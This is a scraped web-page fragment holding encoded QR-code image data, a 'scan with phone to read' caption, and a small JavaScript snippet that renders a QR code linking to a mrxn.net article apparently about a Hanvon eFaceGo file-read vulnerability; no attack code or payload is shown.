Rg8K23wOL/ekJzUD+HtzxDoW8y9wl5XPU+HYgG6F5xP384rTQD3KBag59KCORf23vhe4cwOpwf2s8E6kJY7zoxwDMmvNyQn8kN4LQR46Xtntlh5/j3As6aeHuh1uP/tJt45I3nq4eiVZy05+PrQWb1wr0mfyKwzXfVZe5aDr70WogHCq03gZvnBMZilCZonKBbgvA6ugVn+HTRPAPvALG3nl6aaoLhCWkWtJYZjvrzRw9KE5JXBvdHkE5KD69KE6GshSS5+/wmshUDfFjgHc25Tm6yQXvMaq1ZRa4rhmK1cqH7F0gQ4vFVXTZA2Ae4B81k9Otx/66w18Bwg8o2B9S1fAhyxct2foFgA16UJ0irWQqpwxe89gfXBcN6CNidMHbzd6EDC9YQAN05BcwQ4akDK659agdUXEZyDWf3CrNcc9l71CfGGpQngvuhi6YJiQbGgWAD3gFk1QbVXAe4Fc/quNyQn8UN4fTDMvYC3Beap6ykQoleWXgF9RmrpSQ7337tTC6dnMvga8qUGhyYdnKcehq7Le1aD7o0vDEddc4RZg8OjmjwV0oTrDdEp/CCsnyF1UzWe9wn3W44HXANz9MmZH1154q8y3L9l0O8DnOt6Qq6lWEheWfpnAL4G3N9P5tT5isE9qV9viE7lB2EtBLwl6JytTYbDN/8u8UaHwwtE3vJZb8xA+20suhhcmzNUE6JD94FzQLaFeFfy8QVo14XzfPZ+tK8/4J7UoefL9PFlLeSDrz8/5ATab1nZXu4NvEXoPH3yRwN7k4flEcB1xQIgagDWE5le6Hn0NCUX7zTp4Bmpg3PVBOlgDTqrLoB1xYJ6BMWC4gnpFbCfkb7rDclJ/BBev2XlXqBvr262xvFXht4LzuOp/YrBdcXxwKFJB+epnzHYB/ecHs0TZg7uid7ZGdijfsHq8RWOelSw9moe3/WG5CR+CK+FaOsV0LebewXrYFZPamE4arUO1sEcvxisyS9Az+URwDqYpZ1BcwToXmnCrk+6kJriCvAsMMcXButApPWzEI78VjgJ1kJmLTdxpqcOx4WipQe43QwQ+Y7h/EMUsGbM2RkSvXJq4N6Zg3Uwpze+Rzy9cD8jnsmZGz05eAaYtwuJ+eK/fwLr117wduA1rrcJ7qma4vkkSBOiVwbPALN8FbDX4wES3rjOr3EM0WoOPHwj4w3PGdHF4FmKX0FmXW/IK6f1Fz1rIdnOM573Jf/UZi5PBfjJgYNTTy+4lnzWo4dVTxyGPiO6vEJysA+I9JTVL8QIrDcruVh1QfEOqlWAZ6yF7Bou7T0n0BYC3hJ0fnRr2fL0wGsz1D97pQnRwbOkCVMH14GU1j8NV++tMAJ5hCG3FLh7A6pB/YI0sBc6qyZA18G5akJbiIQLf/4EHl3hWwsBbxcO1pNSMS9ea4pnXTl4nmJBPkGxoFhQLNRYuQB9BjiHzvJOQPdovjB9u1y+iulJ7Uz/1kLm0Cv//gl8eyHZeBj60zVvEe7rYG16n+X1mvFGSx6OPnlXjxYG3x+Yp578Eee60GekB6x/eyEZePF/cwJtIdni5LNLyfeopnoAfgKSh4GzEXc6sH7bgc6ZJQbXFAvgPMPAOZiji+Fek645FbD3yTuRPug90eNP3haS4sXvO4G1EPD24DG/cpvZdLzgmVNPvXI8k8EzqrfGQE1bnFlNfJKkJwysNzNt0cPguvJ4wFryV3kt5FXz5fvzJ/A/AAAA//9JxGl6AAAABklEQVQDAK22ObbkNrMXAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-leaveList-exportResourceByFilePath-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 